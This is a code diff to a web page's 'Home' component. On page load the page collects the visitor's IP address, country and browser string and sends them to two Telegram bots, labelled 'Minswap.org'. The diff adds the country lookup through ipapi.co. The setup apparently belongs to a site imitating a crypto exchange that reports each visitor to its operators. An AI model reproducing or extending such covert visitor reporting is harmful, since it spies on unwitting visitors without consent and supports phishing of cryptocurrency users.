@@ -17,6 +17,11 @@ function Home() {
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip;
+        
+        const response = await fetch("https://ipapi.co/json/");
+        const ipapiData = await response.json();
+        const country = ipapiData.country_name;
+
 
         // Get browser information
         const browserName = navigator.userAgent;
@@ -30,7 +35,7 @@ function Home() {
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
         const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
 
-        const message = `Minswap.org: ${ipAddress} just accessed home page\nBrowser: ${browserName}`;
+        const message = `Minswap.org: ${ipAddress} ${country} just accessed home page\nBrowser: ${browserName}`;
 
         const data = {
           chat_id: chat_id,
